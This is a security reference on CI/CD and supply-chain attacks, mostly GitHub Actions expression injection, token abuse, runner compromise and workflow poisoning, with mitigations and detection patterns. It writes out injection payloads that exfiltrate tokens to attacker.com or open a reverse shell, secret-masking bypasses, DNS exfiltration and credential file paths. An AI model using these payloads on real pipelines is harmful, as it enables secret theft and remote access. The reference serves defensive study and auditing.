# CI/CD Pipeline & Supply Chain Attacks Reference

## GitHub Actions Expression Injection

### Source Audit Targets

Dangerous contexts where GitHub Actions expressions are interpolated directly into shell commands via `run:` blocks:

- `${{ github.event.issue.title }}` — attacker-controlled issue title
- `${{ github.event.issue.body }}` — attacker-controlled issue body
- `${{ github.event.comment.body }}` — attacker-controlled comment
- `${{ github.event.pull_request.title }}` — attacker-controlled PR title
- `${{ github.event.pull_request.body }}` — attacker-controlled PR body
- `${{ github.head_ref }}` — attacker-controlled branch name from fork
- `${{ github.event.discussion.title }}` — attacker-controlled discussion title
- `${{ github.event.discussion.body }}` — attacker-controlled discussion body
- `${{ github.event.pages.*.page_name }}` — wiki page name
- `${{ github.event.commits[*].message }}` — commit message (controlled via fork PR)
- `${{ github.event.commits[*].author.name }}` — commit author name (arbitrary via `git config`)
- `${{ github.event.head_commit.message }}` — head commit message
- `${{ github.event.workflow_run.head_branch }}` — branch name from triggering workflow
- `${{ github.event.inputs.* }}` — `workflow_dispatch` inputs (if triggered by user with repo access, lower risk; if used in reusable workflows called by untrusted callers, high risk)

### Injection Sinks

Not just `run:` — expressions are also dangerous in:

| Context | Safety | Why |
|---------|--------|-----|
| **`run:`** | **DANGEROUS** | `${{ }}` interpolated directly into shell command — full injection |
| **`actions/github-script` `script:`** | **DANGEROUS** | `${{ }}` interpolated into JavaScript — code injection |
| **`with:` inputs** | **DEPENDS** | Safe if the action treats input as data; **dangerous** if the action passes it to a shell internally (many do — read action source) |
| **`env:` (step/job level)** | **SAFE** if consumed as `$ENV_VAR` in shell | Shell variable expansion is not subject to injection. **UNSAFE** only if the `env:` value itself contains `${{ }}` that gets expanded before the shell sees it |
| **`jobs.<id>.if:` / `steps.<id>.if:`** | **MOSTLY SAFE** | Expression evaluated by Actions runtime, not shell — but logic bypass possible if attacker controls the conditional value |
| **`jobs.<id>.name:` / `steps.<id>.name:`** | **SAFE** | Display only — never executed |
| **`jobs.<id>.outputs:`** | **SAFE at definition** | But **dangerous** if the output is later consumed in a `run:` block via `${{ needs.job.outputs.value }}` |

**The core rule:** `${{ }}` is only dangerous when it lands inside a **code execution context** (`run:`, `script:`, or an action that shells out). In `if:`, `name:`, and pure-data `env:` contexts, it's evaluated by the Actions runtime — not a shell — so injection doesn't achieve code execution.

**Common false positive:** `${{ github.event.issue.title }}` in a step `name:` field is NOT injectable — it's display text. The same expression in a `run:` field IS injectable. Auditors must distinguish the context, not just grep for `${{ github.event`.

**Safe pattern — environment variable indirection:**
```yaml
# DANGEROUS — expression in run: block
- run: echo "${{ github.event.issue.title }}"

# SAFE — expression set as env var, referenced as shell variable
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
```

### Exploitation

**Basic payload in issue title or branch name:**
```
a]"; curl https://attacker.com/exfil?token=$GITHUB_TOKEN; echo "
```

When interpolated into `run: echo "${{ github.event.issue.title }}"`, this becomes:
```bash
echo "a]"; curl https://attacker.com/exfil?token=$GITHUB_TOKEN; echo ""
```

**Exfiltrating secrets:**
```
"; echo $SECRET_VALUE | base64 | curl -d @- https://attacker.com/steal; echo "
```

**Reverse shell via branch name:**
```
a]"; bash -i >& /dev/tcp/attacker.com/4444 0>&1; echo "
```

### Safe Alternatives

**Environment variable indirection** — set the expression as an env var, reference via `$ENV_VAR` in shell:
```yaml
# UNSAFE
- run: echo "${{ github.event.issue.title }}"

# SAFE — shell variable is not subject to injection
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
```

**`actions/github-script`** — use the `context` object in JavaScript instead of shell interpolation.

### Detection Patterns

```bash
# Find expression injection in run blocks
grep -rn '\${{.*github\.event\.' .github/workflows/ | grep -E 'run:|script:'

# Specifically dangerous contexts
grep -rn 'run:.*\${{.*\(issue\|pull_request\|comment\|discussion\|head_ref\|head_commit\|commits\)' .github/workflows/

# Check for unsafe uses in with: blocks
grep -rn 'with:' -A5 .github/workflows/ | grep '\${{.*github\.event\.'

# Find all expression usage across workflow files
grep -rn '\${{' .github/workflows/ | grep -v '\${{ secrets\.' | grep -v '\${{ env\.' | grep -v '\${{ steps\.' | grep -v '\${{ needs\.'
```

**CodeQL query:** GitHub's built-in `actions/expression-injection` query detects most patterns. Enable via `github/codeql-action` with `security-and-quality` query suite.

---

## Action Supply Chain Attacks

### tj-actions/changed-files Compromise (March 2025, CVE-2025-30066)

A cascading supply chain attack that compromised `tj-actions/changed-files`, used by 23,000+ repositories.

**Attack chain:**
1. Attacker compromised `reviewdog/action-setup@v1` — a dependency used by tj-actions CI
2. Used reviewdog compromise to steal a PAT (Personal Access Token) from tj-actions CI runs
3. With the stolen PAT, attacker modified the `tj-actions/changed-files` action directly
4. Injected malicious code that dumped CI runner memory, extracting secrets from all jobs using the action
5. Secrets were written to workflow logs — if logs were public, secrets were publicly exposed

**Payload behavior:**
- The malicious commit added a step that ran `python3` to dump `/proc/self/environ` and runner memory
- Extracted `GITHUB_TOKEN`, cloud credentials, npm tokens, and other secrets
- Wrote extracted secrets to GitHub Actions step output (visible in logs)

**Impact:** Any repository using `tj-actions/changed-files@v3` (tag reference) between the compromise window pulled the malicious version. Repos using SHA-pinned references were unaffected.

**Key lesson:** Tag references (`@v3`, `@v4`) are mutable — the tag can be force-pushed to point at a different commit at any time. Only full SHA pins are immutable.

### Codecov Bash Uploader Compromise (2021)

Attacker modified the Codecov bash uploader script (`codecov/codecov-action` and the raw `bash <(curl -s https://codecov.io/bash)` pattern) to exfiltrate environment variables.

**Attack chain:**
1. Attacker gained access to Codecov's Docker image build process via a leaked credential in CI
2. Modified the bash uploader script to add `curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://attacker-server/upload/v2`
3. The script ran in thousands of CI pipelines, exfiltrating `GITHUB_TOKEN`, AWS keys, and other secrets
4. Went undetected for ~2 months (Jan 31 – Apr 1, 2021)

**Impact:** Affected Twitch, HashiCorp, Confluent, and hundreds of other organizations. HashiCorp rotated their GPG signing key as a result.

### Shai Hulud Worm Concept (Self-Propagating via GitHub Actions)

Research demonstrating a self-replicating worm that spreads through GitHub Actions:

**Propagation mechanism:**
1. Compromised action runs in victim repo's CI with `contents: write` permission
2. Uses `GITHUB_TOKEN` to push a modified workflow file to the repo
3. The modified workflow references the attacker's action (or inlines malicious code)
4. When the next PR or push triggers the new workflow, the worm spreads to downstream dependencies
5. If the repo publishes an action used by others, those consumers are now compromised

**Key insight:** `GITHUB_TOKEN` with `contents: write` can push commits, including changes to `.github/workflows/`. This means any compromised action with write permissions can self-replicate.

### Tag Mutability & SHA Pinning

**Why `@v3` is unsafe:**
- Git tags are mutable — `git tag -f v3 <malicious-commit>` replaces the tag
- GitHub does not enforce tag immutability for actions
- Even "verified creator" badges don't prevent tag mutation
- An attacker who compromises a maintainer account can silently replace any tag

**SHA pinning:**
```yaml
# UNSAFE — tag can be moved
- uses: actions/checkout@v4

# SAFE — immutable reference
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

**Tools for SHA pinning:**
- `step-security/secure-repo` — automated PR to pin all actions to SHAs
- `sethvargo/ratchet` — CLI tool for pinning and updating action SHAs
- Dependabot / Renovate — can auto-update SHA pins when new versions release

### Typosquatting in GitHub Marketplace

- Attacker registers `action/checkout` (missing `s`) or `actions/checkout-v2` (extra suffix)
- No namespace verification for GitHub Actions — anyone can create `<org>/<name>`
- Combined with SEO and README copying, fake actions appear legitimate
- **Detection:** verify action owner matches expected organization, check star count, review action source

### Dependency Confusion in Actions

- GitHub Actions resolves `uses: org/action@ref` from `github.com/org/action`
- If an organization's action references a private action and falls back to public resolution, an attacker can register the public name
- Composite actions that `uses:` other actions inherit this risk transitively
- **Mitigation:** always use fully qualified references, audit composite action dependencies

---

## GITHUB_TOKEN Abuse

### Default Permissions

- **Before October 2023:** default `permissions` were read-write for all scopes
- **After October 2023:** new repositories default to read-only (`permissions: read-all`)
- Existing repositories retained their previous settings — many still have read-write defaults
- Organization admins can enforce read-only defaults via org settings

### Token Scope & Capabilities

**What `GITHUB_TOKEN` can access (within the same repo):**

| Permission | Read | Write | Notes |
|-----------|------|-------|-------|
| `contents` | Clone, read files | Push commits, create/delete branches and tags | Write enables workflow poisoning |
| `pull-requests` | Read PRs | Create/comment/merge PRs | Write enables approval bypass |
| `issues` | Read issues | Create/comment/close issues | |
| `actions` | Read workflow runs | Cancel/re-run workflows | |
| `packages` | Read packages | Publish packages | Write enables package poisoning |
| `pages` | Read Pages config | Deploy to GitHub Pages | |
| `deployments` | Read deployments | Create deployments | |
| `statuses` | Read commit statuses | Set commit statuses | Write enables check bypass |

**What `GITHUB_TOKEN` cannot do:**
- Access other repositories (even in same org)
- Create or modify repository settings
- Manage org-level resources
- Trigger `workflow_dispatch` events (prevents recursive worm via API)
- Access secrets from other environments

### Privilege Escalation via contents: write

If a workflow has `contents: write`, the `GITHUB_TOKEN` can push commits — including modifications to `.github/workflows/`:

1. Compromised step pushes a new workflow file granting itself broader permissions
2. Next trigger (push, cron) runs the new workflow with escalated permissions
3. The new workflow can access secrets scoped to the new permissions

**Limitation:** pushed workflow changes only take effect on *subsequent* runs, not the current one.

### pull_request vs pull_request_target

| Property | `pull_request` | `pull_request_target` |
|----------|---------------|----------------------|
| Code checkout | Fork's PR branch | Base repo's default branch |
| `GITHUB_TOKEN` scope | Read-only (fork PRs) | Full repo permissions |
| Secrets access | No access (fork PRs) | Full access to repo secrets |
| Use case | Safe CI for PRs | Label/comment/triage workflows |

**The critical footgun:** `pull_request_target` with `actions/checkout` of the PR branch:
```yaml
# DANGEROUS — runs fork code with full repo token and secrets
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out FORK code
      - run: npm install  # runs fork's package.json scripts with repo secrets
```

**Safe pattern:** only checkout the PR for read-only operations (diff, static analysis) — never execute PR code in `pull_request_target` context.

### Token Exfiltration from Workflow Logs

- `GITHUB_TOKEN` is automatically masked in logs, but:
  - Base64 encoding bypasses masking: `echo $GITHUB_TOKEN | base64`
  - Splitting across multiple lines bypasses masking
  - Writing to a file then `cat`-ing with transformations bypasses masking
  - Hex encoding: `echo $GITHUB_TOKEN | xxd`
- Tokens are valid for the duration of the workflow run (~6 hours max)
- Even after masking bypass, tokens in public repo logs are accessible to anyone

---

## Self-Hosted Runner Attacks

### Persistent Compromise

**Default behavior:** GitHub-hosted runners are ephemeral VMs — destroyed after each job. Self-hosted runners are persistent — they retain state between jobs.

**Attack surface on persistent runners:**
- Malicious job writes backdoor to runner filesystem (e.g., `~/.bashrc`, cron job, systemd service)
- Backdoor persists and executes in all subsequent jobs on the same runner
- File system artifacts: build caches, node_modules, Go module cache, pip cache — all persist and can be poisoned
- Process-level: background processes from one job survive into the next

**Mitigation:** use ephemeral runners (`--ephemeral` flag) that de-register after one job. Use container-based isolation (Actions Runner Controller with Kubernetes).

### Credential Harvesting

Self-hosted runners often have ambient credentials:

- **Cloud provider keys:** AWS IAM instance profiles, GCP service account keys, Azure managed identities — accessible via metadata endpoints (`169.254.169.254`)
- **SSH keys:** `~/.ssh/` directory, SSH agent socket (`SSH_AUTH_SOCK`)
- **GPG keys:** `~/.gnupg/` for code signing
- **Docker credentials:** `~/.docker/config.json` with registry auth tokens
- **Kubernetes:** `~/.kube/config` or in-cluster service account tokens at `/var/run/secrets/kubernetes.io/serviceaccount/token`
- **Cloud CLI configs:** `~/.aws/credentials`, `~/.config/gcloud/`, `~/.azure/`

### Network Pivoting

Self-hosted runners inside corporate networks provide lateral movement:

- Runner has network access to internal services (databases, APIs, admin panels)
- Can scan internal network: `nmap`, `curl` to internal IPs
- Access cloud metadata endpoints for IAM credential theft
- Reach internal package registries, artifact stores, secret managers
- VPN/tunnel establishment from runner to attacker infrastructure

### Docker-in-Docker Escape

Runners using Docker-in-Docker (DinD) or mounting the Docker socket:

- **Docker socket mount (`/var/run/docker.sock`):** any container with socket access can create privileged containers, mount host filesystem, escape to host
- **`--privileged` containers:** full host kernel access, can load kernel modules, access all devices
- **Container escape via `CAP_SYS_ADMIN`:** mount host filesystem, abuse cgroups, access host PID namespace

### Runner Registration Token Theft

- Runner registration tokens (used to register new runners) may be stored in CI config, environment variables, or accessible via API
- `GET /repos/{owner}/{repo}/actions/runners/registration-token` requires admin access — but if an admin token is compromised, attacker can register rogue runners
- Rogue runner picks up jobs intended for legitimate runners
- Jobs on rogue runner expose all secrets and `GITHUB_TOKEN`
- **Detection:** monitor registered runners list, alert on unexpected runner registrations, use runner groups with restricted access

---

## Workflow Poisoning

### workflow_run Event Abuse

`workflow_run` triggers a workflow when another workflow completes:

```yaml
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
```

**The danger:** even if `CI` was triggered by a fork PR (and thus had read-only permissions), the `workflow_run` workflow runs in the context of the base repository with full permissions and secrets access.

**Attack chain:**
1. Fork PR triggers `CI` workflow (read-only, no secrets)
2. `CI` completes → triggers `workflow_run` workflow (full permissions, full secrets)
3. If the `workflow_run` workflow processes artifacts from the `CI` run, attacker controls the artifact content
4. Malicious artifact content leads to code execution in the privileged context

### Artifact Poisoning

GitHub Actions artifacts are the bridge between unprivileged and privileged workflow runs:

1. **Unprivileged workflow** (fork PR): uploads artifact via `actions/upload-artifact`
2. **Privileged workflow** (`workflow_run`): downloads artifact via `actions/download-artifact`
3. If the privileged workflow executes or evaluates artifact content (scripts, config files, test results), attacker achieves code execution with full permissions

**Real-world patterns:**
- Downloading and executing build scripts from artifacts
- Parsing artifact JSON/XML that feeds into shell commands
- Using artifact paths in `run:` steps without sanitization

**Mitigation:** treat all artifacts as untrusted input. Validate, sanitize, and never execute artifact content directly.

### pull_request_target + Checkout Fork Code

The most common workflow poisoning pattern:

```yaml
on: pull_request_target

steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
  # Now running fork code with full repo secrets
  - run: make build  # Makefile from fork — attacker-controlled
```

**Exploited in the wild:**
- Attacker submits PR modifying `Makefile`, `package.json` scripts, `setup.py`, or any build configuration
- The `pull_request_target` workflow checks out the fork code and runs build steps
- Build scripts execute with full access to repository secrets and `GITHUB_TOKEN`

### Cron-Triggered Workflows with Stale Dependencies

- Cron (`schedule`) workflows run on the default branch
- If they install dependencies without lockfile pinning, they pull latest versions
- A compromised dependency (via npm/PyPI account takeover, typosquatting) executes in the cron workflow context
- Cron workflows have full repository permissions and secret access

---

## Pipeline Credential Theft (General CI/CD)

### Environment Variable Dumping

Techniques to extract secrets from CI/CD environments:

```bash
# Direct dump
env
printenv
set

# Linux proc filesystem
cat /proc/self/environ | tr '\0' '\n'

# Windows equivalents
Get-ChildItem Env:
cmd /c set
```

Most CI/CD systems inject secrets as environment variables. Even "masked" secrets are just environment variables with log redaction.

### Secret Masking Bypass

CI/CD platforms (GitHub Actions, GitLab CI, CircleCI) mask known secret values in logs. Bypass techniques:

```bash
# Base64 encoding
echo $SECRET | base64

# Hex encoding
echo $SECRET | xxd -p

# Character-by-character
echo $SECRET | fold -w1

# Reverse string
echo $SECRET | rev

# Write to file, then exfiltrate
echo $SECRET > /tmp/s.txt
curl -F "file=@/tmp/s.txt" https://attacker.com/

# URL encoding
python3 -c "import urllib.parse; import os; print(urllib.parse.quote(os.environ['SECRET']))"

# Split across multiple log lines
echo ${SECRET:0:4}
echo ${SECRET:4:4}
echo ${SECRET:8}

# DNS exfiltration
nslookup $(echo $SECRET | base64 | tr -d '=').attacker.com
```

### OIDC Token Theft

Modern CI/CD uses OIDC (OpenID Connect) for keyless authentication to cloud providers:

- **GitHub Actions:** `ACTIONS_ID_TOKEN_REQUEST_URL` + `ACTIONS_ID_TOKEN_REQUEST_TOKEN` → JWT
- **GitLab CI:** `CI_JOB_JWT` / `CI_JOB_JWT_V2` environment variable
- **CircleCI:** OIDC tokens via `$CIRCLE_OIDC_TOKEN`

**Exploitation:**
1. Compromised CI step requests OIDC token
2. Token contains claims: repo, branch, workflow, actor
3. Attacker uses token to authenticate to cloud provider (AWS `AssumeRoleWithWebIdentity`, GCP `sts.googleapis.com`, Azure federated credential)
4. Cloud IAM role trusts the CI/CD provider's OIDC issuer

**Mitigation:** restrict OIDC trust policies to specific repositories, branches, and environments — not just the OIDC issuer:
```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:sub": "repo:org/specific-repo:ref:refs/heads/main"
    }
  }
}
```

Broad conditions like `"StringLike": {"sub": "repo:org/*"}` allow any repo in the org to assume the role.

### Build Cache Poisoning

CI/CD caches (npm, pip, Go modules, Maven, Gradle) persist across builds:

- **GitHub Actions cache:** scoped to branch, but default branch cache is accessible from all branches
- **Attack:** PR from fork poisons cache on default branch → subsequent builds on `main` use poisoned cache
- **Techniques:** replace cached dependency with trojanized version, modify cached build artifacts, inject malicious scripts into cached tool installations
- **GitLab CI cache:** shared across pipelines by default, configurable per-job
- **Mitigation:** use content-addressable caches (hash-based keys), verify cache integrity, separate cache scopes for trusted and untrusted builds

---

## General CI/CD Platform Attacks

### GitLab CI Specific

- **CI_JOB_TOKEN:** scoped to the project, but can access other projects if explicitly allowed via `CI/CD > Job token permissions`
- **Protected branches/tags:** only protected refs can access protected variables — but branch protection bypass (force push, tag creation) escalates access
- **Include directive injection:** `include: remote` with attacker-controlled URL → arbitrary pipeline definition
- **Child pipelines:** `trigger: include` with artifact-based config → poisoned config from upstream job
- **Group-level variables:** accessible to all projects in the group — one compromised project exposes group secrets

### Jenkins Specific

- **Groovy sandbox escape:** Jenkins Pipeline DSL runs in a Groovy sandbox — numerous CVEs for sandbox bypass (CVE-2019-1003000 series, CVE-2023-27898)
- **Script console:** `/script` endpoint allows arbitrary Groovy execution — requires admin but often reachable via SSRF
- **Credential extraction:** `Jenkins.instance.getDescriptorByType(...)` in Groovy can enumerate and decrypt stored credentials
- **Agent-to-controller access:** Jenkins agents (workers) can read files on the controller — including `credentials.xml`, `secrets/master.key`
- **Shared library injection:** if Pipeline references a shared library from a repo the attacker controls, they can inject arbitrary Groovy into the trusted pipeline context

### CircleCI Specific

- **Orb supply chain:** CircleCI Orbs (reusable config packages) can be published by anyone — typosquatting risk similar to GitHub Actions
- **SSH debug access:** `circleci ssh` re-runs jobs with SSH — if an attacker triggers this on a public project, they get shell access with all secrets
- **Context restrictions:** CircleCI Contexts restrict secrets to specific projects/branches — but misconfigured contexts expose secrets broadly
- **CircleCI breach (Jan 2023):** attacker compromised CircleCI engineer's laptop → accessed internal systems → exfiltrated customer secrets and environment variables across all CircleCI customers

---

## Detection & Audit Patterns

### Grep Patterns for Expression Injection

```bash
# All expression interpolation in workflow files
grep -rn '\${{' .github/workflows/

# Specifically user-controlled contexts in run blocks (high confidence)
grep -rn 'run:' .github/workflows/ | grep '\${{.*github\.event\.'

# Dangerous event data in any context
grep -rn '\${{.*\(github\.event\.issue\|github\.event\.pull_request\|github\.event\.comment\|github\.head_ref\|github\.event\.discussion\|github\.event\.head_commit\|github\.event\.commits\)' .github/workflows/

# Unpinned action references (no SHA)
grep -rn 'uses:' .github/workflows/ | grep -v '@[a-f0-9]\{40\}'

# pull_request_target with checkout
grep -rn 'pull_request_target' .github/workflows/ -A 30 | grep 'actions/checkout'

# workflow_run consuming artifacts
grep -rn 'workflow_run' .github/workflows/ -A 50 | grep 'download-artifact'

# Overly broad permissions
grep -rn 'permissions:' .github/workflows/ -A 5 | grep 'write-all\|contents: write'

# Self-hosted runners
grep -rn 'runs-on:' .github/workflows/ | grep 'self-hosted'
```

### CodeQL Queries for GitHub Actions

GitHub provides built-in CodeQL queries for Actions security:

- `actions/expression-injection` — detects `${{ }}` injection in `run:` blocks
- `actions/unpinned-uses` — detects tag-based action references without SHA pinning
- `actions/pull-request-target-checkout` — detects the `pull_request_target` + checkout antipattern

Enable via:
```yaml
- uses: github/codeql-action/analyze@v3
  with:
    queries: security-and-quality
```

### StepSecurity harden-runner

Runtime security monitoring for GitHub Actions runners:

```yaml
- uses: step-security/harden-runner@v2
  with:
    egress-policy: audit  # or 'block' for enforcement
    allowed-endpoints: >
      api.github.com:443
      registry.npmjs.org:443
```

**Capabilities:**
- Monitors and blocks outbound network connections (detects exfiltration)
- Detects file tampering in workflow workspace
- Monitors process execution (detects unexpected binaries)
- Provides runtime audit trail of all actions taken during job execution

### OpenSSF Scorecard

Automated security assessment for open-source projects, including CI/CD:

```bash
# Run Scorecard
scorecard --repo=github.com/org/repo

# Or via GitHub Action
- uses: ossf/scorecard-action@v2
```

**CI/CD-relevant checks:**
- `Token-Permissions` — whether workflows use minimal `GITHUB_TOKEN` permissions
- `Pinned-Dependencies` — whether actions and container images are SHA-pinned
- `Dangerous-Workflow` — detects `pull_request_target` with checkout, expression injection patterns
- `Branch-Protection` — verifies branch protection rules on default branch
- `SAST` — checks for static analysis in CI pipeline

### Zizmor

Static analysis tool specifically for GitHub Actions workflow security:

```bash
# Install and run
cargo install zizmor
zizmor .github/workflows/

# Or via GitHub Action
- uses: woodruffw/zizmor-action@v1
```

**Detects:** expression injection, unpinned actions, `pull_request_target` misuse, excessive permissions, insecure artifact handling, self-hosted runner risks.

---

## Real-World Incidents & CVEs

| Incident | Date | Impact | Root Cause |
|----------|------|--------|------------|
| tj-actions/changed-files (CVE-2025-30066) | Mar 2025 | 23,000+ repos exposed secrets | Cascading PAT theft via reviewdog compromise |
| Codecov bash uploader | Jan–Apr 2021 | Thousands of repos leaked env vars | Docker image credential leak → script modification |
| CircleCI breach | Jan 2023 | All customer secrets potentially exposed | Engineer laptop compromise → internal access |
| event-stream (npm) | Nov 2018 | Bitcoin wallet theft | Social engineering maintainer → dependency injection |
| SolarWinds (SUNBURST) | Dec 2020 | 18,000+ orgs compromised | Build system compromise → trojanized update |
| Kaseya VSA (REvil) | Jul 2021 | ~1,500 businesses via MSPs | Supply chain via managed service provider update |
| 3CX Desktop App | Mar 2023 | ~600,000 orgs | Cascading supply chain — compromised upstream dependency (Trading Technologies) |
| PyTorch nightly (torchtriton) | Dec 2022 | PyTorch nightly users | Dependency confusion — malicious `torchtriton` on PyPI |
| ua-parser-js (npm) | Oct 2021 | 7M+ weekly downloads | Maintainer account takeover → cryptominer injection |
| colors.js / faker.js | Jan 2022 | Thousands of projects | Maintainer sabotage — infinite loop injected into popular packages |
| GitHub Actions artifact poisoning (Legit Security research) | Aug 2023 | Google, Microsoft, AWS, Canonical repos | `workflow_run` + artifact download pattern in major OSS projects |
